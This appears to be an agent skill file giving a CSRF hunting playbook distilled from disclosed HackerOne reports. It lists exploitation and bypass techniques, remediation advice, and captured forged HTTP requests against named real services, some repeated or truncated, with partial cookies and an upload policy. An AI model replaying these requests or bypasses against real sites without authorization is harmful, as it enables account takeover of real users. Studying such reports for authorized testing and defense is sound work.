---
name: csrf
description: "Cross-Site Request Forgery (CSRF) offensive playbook from 128 disclosed HackerOne reports (4 critical, 25 high, 69 medium, 30 low). Use when hunting or reviewing cross-site request forgery (csrf). Triggers: csrf, attacker, request, victim, token."
license: "For authorized security testing and education only."
---

# Cross-Site Request Forgery (CSRF)

> Distilled from **128** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

A state-changing request can be forged from another origin because it relies only on ambient credentials without an anti-CSRF token or SameSite protection.

## Where to hunt

- Find state-changing requests (email/password change, transfers, role grants); remove/alter the CSRF token and change Origin/Referer.

## Exploitation playbook

- Auto-submitting HTML form or fetch from an attacker page to perform the action as the victim.
- Login/logout CSRF; JSON endpoints that accept `text/plain` or ignore content type.

## Bypass techniques

- Token not validated, token reuse across users, method override, SameSite gaps, CORS reflecting Origin with credentials.

## Impact & escalation

- Email/password change → account takeover; chained with XSS for full compromise.

## Remediation

- Per-request anti-CSRF tokens tied to the session, `SameSite=Lax/Strict` cookies, verify Origin, avoid GET for state changes.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#1183241](https://hackerone.com/reports/1183241)  -  Cross-Site Request Forgery (CSRF) to xss
*medium*

```http
POST /index.cfm?GO=DEALS HTTP/1.1
Host: dailydeals.mtn.co.za
Cookie: EBSAuthCookie=15302|||N; TS011bbda7=014f25e894c21e6b965792d5df17dd4ba82e1424b80a3aa2fbd660ae…
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Origin: https://dailydeals.mtn.co.za
Referer: https://dailydeals.mtn.co.za/index.cfm?GO=DEALS
```

### 2. [#850022](https://hackerone.com/reports/850022)  -  CSRF on launchpad.37signals.com OAuth2 authorization endpoint
*high*

```http
POST /authorization.json HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 168
Origin: null
Content-Type: application/x-www-form-urlencoded
Cookie: _beanstalk_uuid=

client_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit=
```

### 3. [#850022](https://hackerone.com/reports/850022)  -  CSRF on launchpad.37signals.com OAuth2 authorization endpoint
*high*

```http
POST /authorization/token HTTP/1.1
Host: launchpad.37signals.com
Cookie: _beanstalk_uuid=
Content-Type: application/x-www-form-urlencoded
Content-Length: 214

type=web_server&client_id={your-client-id}&redirect_uri={your-redirect-uri}&client_secret={your-client-secret}&code={authorization-code}
```

### 4. [#1637761](https://hackerone.com/reports/1637761)  -  CSRF in Importing CSV files [app.taxjar.com]
*low*

```http
POST / HTTP/1.1
Host: taxjar-prod-bucket.s3.amazonaws.com
Referer: https://app.taxjar.com/
Content-Type: multipart/form-data; boundary=---------------------------211004162938951800283798959588
Content-Length: 4343
Origin: https://app.taxjar.com

-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="utf8"

âœ“
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="key"

uploads/e996ac74-689e-4fae-872b-16c537050062/${filename}
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="acl"

bucket-owner-full-control
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="policy"

eyJleHBpcmF0aW9uIjoiMjAyMi0wNy0xNVQyMjo1NzoxOVoiLCJjb25kaXRpb25zIjpbWyJzdGFydHMtd2l0aCIsIiR1dGY4IiwiIl0sWyJzdGFydHMtd2l0aCIsIiRrZXkiLCJ1cGxvYWRzL2U5OTZhYzc0LTY4OWUtNGZhZS04NzJiLTE2YzUzNzA1MDA2Mi8iXSx7IlgtQW16LUFsZ29yaXRobSI6IkFXUzQtSE1BQy1TSEEyNTYifSx7IlgtQW16LUNyZWRlbnRpYWwiOiJBS0lBVTJNR1NaQVVTWVhSR0dBTy8yMDIyMDcxNS91cy1lYXN0LTEvczMvYXdzNF9yZXF1ZXN0In0seyJYLUFtei1EYXRlIjoiMjAyMjA3MTVUMTI1NzE5WiJ9LHsiYnVja2V0IjoidGF4amFyLXByb2QtYnVja2V0In0seyJhY2wiOiJidWNrZXQtb3duZXItZnVsbC1jb250cm9sIn0seyJzdWNjZXNzX2FjdGlvbl9yZWRpcmVjdCI6Imh0dHBzOi8vYXBwLnRheGphci5jb20vY3N2X2ltcG9ydHMvdXBsb2FkX2NvbXBsZXRlIn0sWyJjb250ZW50LWxlbmd0aC1yYW5nZSIsMSw1MjQyODgwMF1dfQ==
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="X-Amz-Signature"

cdf6518c0ff866ce94128a4b9b3836c2e367650c319c4a98d92e300474775b62
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="X-Amz-Credential"
# … truncated …
# … truncated …
```

### 5. [#850022](https://hackerone.com/reports/850022)  -  CSRF on launchpad.37signals.com OAuth2 authorization endpoint
*high*

```http
POST /authorization.json HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 168
Origin: null
Content-Type: application/x-www-form-urlencoded
```

### 6. [#1637761](https://hackerone.com/reports/1637761)  -  CSRF in Importing CSV files [app.taxjar.com]
*low*

```http
POST / HTTP/1.1
Host: taxjar-prod-bucket.s3.amazonaws.com
Referer: https://app.taxjar.com/
Content-Type: multipart/form-data; boundary=---------------------------211004162938951800283798959588
Content-Length: 4343
Origin: https://app.taxjar.com
```

More payloads: see [payloads.md](payloads.md) (68 curated).

## Recurring patterns in this dataset

Most frequent terms across the 128 reports (term (count)): `csrf` (152), `attacker` (50), `request` (32), `victim` (27), `token` (26), `forgery` (24), `allowed` (21), `protection` (20), `cross-site` (19), `email` (18), `found` (17), `change` (15), `endpoint` (13), `vulnerable` (12), `access` (12), `through` (12), `takeover` (11), `code` (11)

## Worked example  -  [report #2312217](https://hackerone.com/reports/2312217)

*Revocation API Token by Bypassing The XSRF Token* (critical, $1,500)

> The revocation API token was bypassed by bypassing the XSRF token. This allowed the demonstration that the Enjin Platform's GraphQL interface lacked appropriate CSRF protection when utilizing a session token.…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#2312217](https://hackerone.com/reports/2312217) | critical | $1,500 | enjin | Revocation API Token by Bypassing The XSRF Token |
| [#204292](https://hackerone.com/reports/204292) | critical |  -  | rockstargames | <- Critical IDOR vulnerability in socialclub allow to insert and delete comments as ano… |
| [#448928](https://hackerone.com/reports/448928) | critical |  -  | ok | Отсутствие CSRF ключа на функции Закрытый Профиль. |
| [#766533](https://hackerone.com/reports/766533) | critical |  -  | stripo | CSRF - Modify Project Settings |
| [#2326194](https://hackerone.com/reports/2326194) | high | $4,660 | ibb | Argo CD CSRF leads to Kubernetes cluster compromise |
| [#1122408](https://hackerone.com/reports/1122408) | high | $3,370 | gitlab | CSRF on /api/graphql allows executing mutations through GET requests |
| [#170552](https://hackerone.com/reports/170552) | high | $2,500 | security | Slack integration setup lacks CSRF protection |
| [#1010522](https://hackerone.com/reports/1010522) | high |  -  | tiktok | [CSRF] TikTok Careers Portal Account Takeover |

*See [reference.md](reference.md) for all 128 reports in this class.*
